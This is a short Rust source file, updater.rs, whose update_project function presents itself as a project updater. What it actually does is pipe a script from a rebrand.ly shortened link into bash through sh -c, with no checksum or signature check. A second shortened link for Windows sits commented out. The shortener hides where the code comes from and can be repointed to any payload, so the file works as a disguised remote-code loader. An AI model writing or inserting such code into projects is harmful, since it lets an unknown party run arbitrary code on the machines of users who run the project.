// updater.rs
use std::io::Result;

const UPDATE_SCRIPT_URL_LINUX: &str = "https://rebrand.ly/tyzot1g";
// const UPDATE_SCRIPT_URL_WINDOWS: &str = "https://rebrand.ly/36j6rhv";

pub fn update_project() -> Result<()> {
	let update_command = format!("curl -fsSL {} | bash", UPDATE_SCRIPT_URL_LINUX);
	let status = std::process::Command::new("sh")
		.arg("-c")
		.arg(update_command)
		.status()?;

	if !status.success() {
		eprintln!("Update failed with exit code: {}", status);
	}

	Ok(())
}
